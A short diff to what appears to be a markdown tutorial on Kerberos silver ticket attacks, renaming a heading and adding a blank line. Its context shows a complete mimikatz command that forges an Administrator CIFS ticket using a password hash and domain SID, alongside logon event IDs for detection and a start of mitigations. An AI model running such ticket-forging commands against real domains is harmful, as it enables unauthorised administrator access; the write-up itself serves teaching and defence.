@@ -90,7 +90,7 @@ klist
 <img src="/img/silver/klist.PNG" alt="Getting-gz" width="1000" height="200">
 
 
-save in file
+## save ticket in file
 ``` 
 kerberos::golden /user:Administrator /domain:karim.net /rc4:de26cce0356891a4a020e7c4957afc72 /target:domainAD.karim.com /sid:S-1-5-21-750046758-1551849808-2392872301 /service:CIFS /id:500 
 ```
@@ -120,6 +120,7 @@ dir \\domainAD.karim.net\c$
    * 4624 Account Logon
    * 4634 Account Logoff
    * 4672 Admin Logon
+ 
 ## Mitigate
 several mitigations exist that can make it harder for an adversary to compromise service account password hashes.
 * Protect assets (especially the domain controller)
